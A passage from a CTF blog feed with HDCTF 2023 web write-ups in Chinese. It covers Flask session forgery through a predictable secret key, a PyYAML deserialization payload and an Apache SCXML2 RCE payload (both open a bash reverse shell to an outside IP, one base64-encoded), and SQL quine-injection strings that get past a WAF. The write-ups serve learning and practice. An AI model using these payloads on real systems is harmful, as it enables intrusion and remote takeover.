class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re, random, uuid</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> yaml</span><br><span class="line"><span class="keyword">from</span> urllib.request <span class="keyword">import</span> urlopen</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="built_in">str</span>(random.random()*<span class="number">233</span>)</span><br><span class="line">app.debug = <span class="literal">False</span></span><br><span class="line">BLACK_LIST=[<span class="string">&quot;yaml&quot;</span>,<span class="string">&quot;YAML&quot;</span>,<span class="string">&quot;YML&quot;</span>,<span class="string">&quot;yml&quot;</span>,<span class="string">&quot;yamiyami&quot;</span>]</span><br><span class="line">app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>]=<span class="string">&quot;/app/uploads&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    session[<span class="string">&#x27;passport&#x27;</span>] = <span class="string">&#x27;YamiYami&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    Welcome to HDCTF2023 &lt;a href=&quot;/read?url=https://baidu.com&quot;&gt;Read somethings&lt;/a&gt;</span></span><br><span class="line"><span class="string">    &lt;br&gt;</span></span><br><span class="line"><span class="string">    Here is the challenge &lt;a href=&quot;/upload&quot;&gt;Upload file&lt;/a&gt;</span></span><br><span class="line"><span class="string">    &lt;br&gt;</span></span><br><span class="line"><span class="string">    Enjoy it &lt;a href=&quot;/pwd&quot;&gt;pwd&lt;/a&gt;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/pwd&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwd</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(pwdpath)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/read&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        url = request.args.get(<span class="string">&#x27;url&#x27;</span>)</span><br><span class="line">        m = re.findall(<span class="string">&#x27;app.*&#x27;</span>, url, re.IGNORECASE)</span><br><span class="line">        n = re.findall(<span class="string">&#x27;flag&#x27;</span>, url, re.IGNORECASE)</span><br><span class="line">        <span class="keyword">if</span> m:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;re.findall(&#x27;app.*&#x27;, url, re.IGNORECASE)&quot;</span></span><br><span class="line">        <span class="keyword">if</span> n:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;re.findall(&#x27;flag&#x27;, url, re.IGNORECASE)&quot;</span></span><br><span class="line">        res = urlopen(url)</span><br><span class="line">        <span class="keyword">return</span> res.read()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> ex:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">str</span>(ex))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;no response&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">allowed_file</span>(<span class="params">filename</span>):</span><br><span class="line">   <span class="keyword">for</span> blackstr <span class="keyword">in</span> BLACK_LIST:</span><br><span class="line">       <span class="keyword">if</span> blackstr <span class="keyword">in</span> filename:</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">   <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_file</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">            flash(<span class="string">&#x27;No file part&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(request.url)</span><br><span class="line">        file = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> file.filename == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Empty file&quot;</span></span><br><span class="line">        <span class="keyword">if</span> file <span class="keyword">and</span> allowed_file(file.filename):</span><br><span class="line">            filename = secure_filename(file.filename)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">&#x27;./uploads/&#x27;</span>):</span><br><span class="line">                os.makedirs(<span class="string">&#x27;./uploads/&#x27;</span>)</span><br><span class="line">            file.save(os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], filename))</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;upload successfully!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/boogipop&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load</span>():</span><br><span class="line">    <span class="keyword">if</span> session.get(<span class="string">&quot;passport&quot;</span>)==<span class="string">&quot;Welcome To HDCTF2023&quot;</span>:</span><br><span class="line">        LoadedFile=request.args.get(<span class="string">&quot;file&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(LoadedFile):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;file not exists&quot;</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(LoadedFile) <span class="keyword">as</span> f:</span><br><span class="line">            yaml.full_load(f)</span><br><span class="line">            f.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;van you see&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Auth bro&quot;</span></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pwdpath = os.popen(<span class="string">&quot;pwd&quot;</span>).read()</span><br><span class="line">    app.run(</span><br><span class="line">        debug=<span class="literal">False</span>,</span><br><span class="line">        host=<span class="string">&quot;0.0.0.0&quot;</span></span><br><span class="line">    )</span><br><span class="line">    <span class="built_in">print</span>(app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>])</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230423153527975.png" alt="image-20230423153527975"></p><p>需要做的事情就2件，伪造Cookie，Yaml反序列化，那么Cookie怎么拿呢？key的种子是由<code>uuid.getnode()</code>生成的，网上检索一波</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在 python 中使用 uuid 模块生成 UUID（通用唯一识别码）。可以使用 uuid.getnode() 方法来获取计算机的硬件地址，这个地址将作为 UUID 的一部分。</span><br></pre></td></tr></table></figure><p>因为审计源码发现，在上传完yaml反序列化的payload后，进入boogipop的这个路由得需要<code>seesion</code>的值为<code>Welcome To HDCTF2023</code></p><p><img src="../images/image-20230423153706421.png" alt="image-20230423153706421"></p><p>这里就是考查的是利用<strong>uuid</strong>来进行session伪造</p><p>种子是通过<code>random.seed(uuid.getnode())</code>生成的。而uuid.getnode()又是将MAC地址转换为10进制。那么我们通过程序中的任意文件读取来获取网卡地址。不就能得到种子了<br>读取/proc/net/dev可以知道服务器上的网卡。接着/sys/class/net/eth0/address可以知道MAC地址</p><p><img src="../images/image-20230423155637069.png" alt="image-20230423155637069"></p><p>然后进行进制转化</p><p><img src="../images/image-20230423160417630.png" alt="image-20230423160417630"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">02:42:ac:02:45:95</span><br><span class="line">2485376927125</span><br></pre></td></tr></table></figure><p>然后获取密钥来进行session伪造</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line">random.seed(<span class="built_in">int</span>(<span class="number">52234918416</span>))</span><br><span class="line">SECRET_KEY = <span class="built_in">str</span>(random.random() * <span class="number">233</span>)</span><br><span class="line"><span class="built_in">print</span>(SECRET_KEY)</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230423160653384.png" alt="image-20230423160653384"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">231.28194338656192</span><br><span class="line">2</span><br></pre></td></tr></table></figure><p>然后拿着密钥去进行session伪造</p><p><a href="https://github.com/noraj/flask-session-cookie-manager">session伪造工具</a></p><p><img src="../images/image-20230423161334979.png" alt="image-20230423161334979"></p><p>然后根据源码进行修改passport为<code>Welcome To HDCTF2023</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#x27;passport&#x27;: &#x27;Welcome To HDCTF2023&#x27;&#125;</span><br></pre></td></tr></table></figure><p>然后进行编码</p><p><img src="../images/image-20230423161614597.png" alt="image-20230423161614597"></p><p>伪造成功</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJwYXNzcG9ydCI6IldlbGNvbWUgVG8gSERDVEYyMDIzIn0.ZETpRg.LJFqsGZPtbnl8N6Ngul7lMTWXgU</span><br></pre></td></tr></table></figure><p>然后先进行paylaod的文件上传</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">!!python/<span class="built_in">object</span>/new:<span class="built_in">str</span></span><br><span class="line">    args: []</span><br><span class="line">    state: !!python/<span class="built_in">tuple</span></span><br><span class="line">      - <span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/101.42.39.110/6666 &lt;&amp;1\&quot;&#x27;)&quot;</span></span><br><span class="line">      - !!python/<span class="built_in">object</span>/new:<span class="built_in">staticmethod</span></span><br><span class="line">        args: []</span><br><span class="line">        state:</span><br><span class="line">          update: !!python/name:<span class="built_in">eval</span></span><br><span class="line">          items: !!python/name:<span class="built_in">list</span></span><br></pre></td></tr></table></figure><p><a href="https://www.tr0y.wang/2022/06/06/SecMap-unserialize-pyyaml/#%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF">关于yaml反序列化的payload</a></p><p>还有很多详细的解释都在里面</p><p>然后就能成功弹到shell了</p><p><strong>总结</strong></p><p>file://伪协议读取源码</p><p>/proc/1/environ 环境变量读取</p><p>正则表达式 re.findall 用法  两次url编码绕过</p><p>uuid进行session伪造</p><p>YAML反序列化</p><h2 id="HDCTF-2023-LoginMaster-quine注入"><a href="#HDCTF-2023-LoginMaster-quine注入" class="headerlink" title="[HDCTF 2023]LoginMaster(quine注入)"></a>[HDCTF 2023]LoginMaster(quine注入)</h2><p>考点</p><p><img src="../images/image-20230424100905511.png" alt="image-20230424100905511"></p><p>这里的话先去了解一下unique注入是啥东西</p><p><a href="https://nosec.org/home/detail/2395.html">详解Laravel 5.8 SQL注入漏洞(unique注入)</a></p><p><strong>漏洞详情</strong></p><p><strong>该漏洞存在于Laravel的表单验证功能，漏洞函数为ignore()，漏洞文件位于/vendor/laravel/ramework/src/Illuminate/Validation/Rules/Unique.php。有时候开发者希望在进行字段唯一性验证时忽略指定字段以及字段值，通常会调用Rule类的ignore方法。该方法有两个参数，第一个参数为字段值，第二个参数为字段名，当字段名为空时，默认字段名为“id”。如果用户可以控制ignore()方法的参数值，就会产生SQL注入漏洞。</strong></p><p>这里的话就扫一下目录发现存在robots.txt文件，然后进行读取，发现存在waf文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkSql</span>(<span class="params"><span class="variable">$s</span></span>) </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/regexp|between|in|flag|=|&gt;|&lt;|and|\||right|left|reverse|update|extractvalue|floor|substr|&amp;|;|\\\$|0x|sleep|\ /i&quot;</span>,<span class="variable">$s</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">alertMes</span>(<span class="string">&#x27;hacker&#x27;</span>, <span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>] === <span class="variable">$password</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable">$FLAG</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">alertMes</span>(<span class="string">&quot;wrong password&quot;</span>,<span class="string">&#x27;index.php&#x27;</span>);</span><br></pre></td></tr></table></figure><p>然后把这段代码到google一搜索，就能找到原题了(<strong>打了这么多比赛 ，等赛后看wp复现的时候才发现原原来好多东西都是可以搜出来，只是自己搜的不过准确</strong>)</p><p><strong>果然 搜索也是一门学问</strong></p><p><a href="https://www.cnblogs.com/zhengna/p/15917521.html">CTFHub_2021-第五空间智能安全大赛-Web-yet_another_mysql_injection（quine注入）</a></p><p>这就是原题的题目，这道题就属于是照搬下来的</p><p><strong>payload1</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;/**/union/**/select/**/replace(replace(&#x27;</span><span class="number">1</span>&quot;/**/union/**/select/**/replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#&#x27;,char(34),char(39)),char(46),&#x27;1&quot;<span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>replace(replace(&quot;.&quot;,<span class="type">char</span>(<span class="number">34</span>),<span class="type">char</span>(<span class="number">39</span>)),<span class="type">char</span>(<span class="number">46</span>),&quot;.&quot;)#<span class="string">&#x27;)#</span></span><br></pre></td></tr></table></figure><p><strong>payload2</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;UNION(SELECT(REPLACE(REPLACE(&#x27;</span><span class="number">1</span>&quot;UNION(SELECT(REPLACE(REPLACE(&quot;<span class="operator">%</span>&quot;,CHAR(34),CHAR(39)),CHAR(37),&quot;<span class="operator">%</span>&quot;)))#&#x27;,CHAR(34),CHAR(39)),CHAR(37),&#x27;1&quot;<span class="keyword">UNION</span>(<span class="keyword">SELECT</span>(REPLACE(REPLACE(&quot;%&quot;,<span class="type">CHAR</span>(<span class="number">34</span>),<span class="type">CHAR</span>(<span class="number">39</span>)),<span class="type">CHAR</span>(<span class="number">37</span>),&quot;%&quot;)))#<span class="string">&#x27;)))#</span></span><br></pre></td></tr></table></figure><p>其实就是看谁做过这题或则是记得拿着题目给的waf去搜，然后发现原题</p><p>然后就直接拿着原题给的wp直接打就行了</p><h2 id="BabyJXvX"><a href="#BabyJXvX" class="headerlink" title="BabyJXvX"></a>BabyJXvX</h2><p><strong>考点</strong>     <strong>Apache SCXML2 RCE</strong></p><p><a href="https://www.yuque.com/boogipop/okvgcs/zzx3n35xsg26ss0e?view=doc_embed">Apache SCXML2 RCE分析</a></p><p>这里我们自己来跟一遍这个逻辑，来学习一下</p><p>这里真的服了，没有文章来进行学习咋样安装环境，直接去maven找的话是找不到的，只能通过报错信息一个一个jar包下载下来</p><p><strong>这里我用的jdk是8</strong>   </p><p><img src="../images/image-20230425142328815.png" alt="image-20230425142328815"></p><p><img src="../images/image-20230425142335239.png" alt="image-20230425142335239"></p><p>就是得自己百度先下载两个jar包，然后maven下载一个新的jar包</p><p>然后在存在xml文件的目录开启一个python服务就可以开始分析这个漏洞了</p><p><img src="../images/image-20230425142503857.png" alt="image-20230425142503857"></p><p><strong>demo</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.scxml2.SCXMLExecutor;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.scxml2.io.SCXMLReader;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.scxml2.model.ModelException;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.scxml2.model.SCXML;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.stream.XMLStreamException;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">POC</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ModelException, XMLStreamException, IOException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// engine to execute the scxml instance</span></span><br><span class="line">        <span class="type">SCXMLExecutor</span> <span class="variable">executor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SCXMLExecutor</span>();</span><br><span class="line">        <span class="comment">// parse SCXML URL into SCXML model</span></span><br><span class="line">        <span class="type">SCXML</span> <span class="variable">scxml</span> <span class="operator">=</span> SCXMLReader.read(<span class="string">&quot;http://127.0.0.1:8000/1.xml&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// set state machine (scxml instance) to execute</span></span><br><span class="line">        executor.setStateMachine(scxml);</span><br><span class="line">        executor.go();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>xml文件</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">scxml</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2005/07/scxml&quot;</span> <span class="attr">version</span>=<span class="string">&quot;1.0&quot;</span> <span class="attr">initial</span>=<span class="string">&quot;run&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">state</span> <span class="attr">id</span>=<span class="string">&quot;run&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">onentry</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="string">&#x27;&#x27;</span>.<span class="title function_">getClass</span>().<span class="title function_">forName</span>(<span class="string">&#x27;java.lang.Runtime&#x27;</span>).<span class="title function_">getRuntime</span>().<span class="title function_">exec</span>(<span class="string">&#x27;calc&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">onentry</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">state</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">scxml</span>&gt;</span></span><br></pre></td></tr></table></figure><p>部署完后看是否能弹计算器，弹不出的话就是说明环境没配置成功</p><p><img src="../images/image-20230425142743847.png" alt="image-20230425142743847"></p><p>然后就开始跟一下这个，看漏洞利用点在哪</p><h3 id="开始分析"><a href="#开始分析" class="headerlink" title="开始分析"></a>开始分析</h3><p><img src="../images/image-20230425142927413.png" alt="image-20230425142927413"></p><p>先给断点</p><p><img src="../images/image-20230425142945860.png" alt="image-20230425142945860"></p><p>先跟到了read方法这里</p><p>进入read方法，又调用了另一个参数不同的read，在这里传入我们xml的path，并且初始化了一个Configuration</p><p><img src="../images/image-20230425143202243.png" alt="image-20230425143202243"></p><p>将XML的路径和配置类都传入readInternal方法里，跟进</p><p><img src="../images/image-20230425143352387.png" alt="image-20230425143352387"></p><p><img src="../images/image-20230425143552489.png" alt="image-20230425143552489"></p><p>然后初始化了一个URLresovler去读取XML，这边咱们的http服务就会接收到对应的请求，最后进入readDocument方法进行下一步读取</p><p><img src="../images/image-20230425143821934.png" alt="image-20230425143821934"></p><p><img src="../images/image-20230425144145979.png" alt="image-20230425144145979"></p><p>前面的实例化对象就没截屏，只截的是关键部分</p><p><img src="../images/image-20230425144408313.png" alt="image-20230425144408313"></p><p>获取xml的namespace和localname，最后进入readSCXML方法中进行更深次的读取</p><p>，这里就是重点了</p><p><img src="../images/image-20230425144705224.png" alt="image-20230425144705224"></p><p>进入readSCXML后，然后接着进入readstate</p><p><img src="../images/image-20230425144903304.png" alt="image-20230425144903304"></p><p>这里会获取几个标签，可以看到包括我们payload里的state标签，由于最外层是state，因此进入readstate方法     </p><p><img src="../images/image-20230425145318146.png" alt="image-20230425145318146"></p><p>第二层标签是onentry，所以进入了readOnEntry方法</p><p><img src="../images/image-20230425145420093.png" alt="image-20230425145420093"></p><p><img src="../images/image-20230425145447949.png" alt="image-20230425145447949"></p><p>进入readExecutableContext方法，接下来也是重点</p><p><img src="../images/image-20230425145549908.png" alt="image-20230425145549908"></p><p>第三层是script，所以读取script标签</p><p><img src="../images/image-20230425145700622.png" alt="image-20230425145700622"></p><p><img src="../images/image-20230425145718355.png" alt="image-20230425145718355"></p><p>跟进readscript</p><p><img src="../images/image-20230425145741954.png" alt="image-20230425145741954"></p><p><strong>太菜了，跟不下去了，还是去看上面的复现文章吧，那样好一点</strong></p><p><img src="../images/image-20230425151120132.png" alt="image-20230425151120132"></p><p><strong>payload</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">scxml</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2005/07/scxml&quot;</span> <span class="attr">version</span>=<span class="string">&quot;1.0&quot;</span> <span class="attr">initial</span>=<span class="string">&quot;run&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">final</span> <span class="attr">id</span>=<span class="string">&quot;run&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">onexit</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">assign</span> <span class="attr">location</span>=<span class="string">&quot;flag&quot;</span> <span class="attr">expr</span>=<span class="string">&quot;&#x27;&#x27;.getClass().forName(&#x27;java.lang.Runtime&#x27;).getRuntime().exec(&#x27;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDEuNDIuMzkuMTEwLzY2NiAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;)&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">onexit</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">final</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">scxml</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>做法</strong></p><p><img src="../images/image-20230425154307051.png" alt="image-20230425154307051"></p><p><img src="../images/image-20230425154316949.png" alt="image-20230425154316949"></p><p>这里先是在自己的服务器上新建一个文件 ，然后开启端口监听就行了</p><p><img src="../images/image-20230425154410279.png" alt="image-20230425154410279"></p><p><a href="https://www.xaitx.com/1936.html">详细wp</a></p><p><strong>根据当时情况一步一步的分析出来的</strong></p><h2 id="HDCTF-2023-JavaMonster"><a href="#HDCTF-2023-JavaMonster" class="headerlink" title="[HDCTF 2023]JavaMonster]"></a>[HDCTF 2023]JavaMonster]</h2><p>考点</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;这里的话是只记录自己不会的知识点&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&quot;HDCTF-2023-YamiYami&quot;&gt;&lt;a href=&quot;#HDCTF-2023-YamiYami&quot; class=&quot;headerlink&quot; title=&quot;[HDCTF 2023]Y</summary>
      
    
    
    
    
    <category term="HDCTF WEB 2023" scheme="https://ke1nys.github.io/tags/HDCTF-WEB-2023/"/>
    
  </entry>
  
</feed>
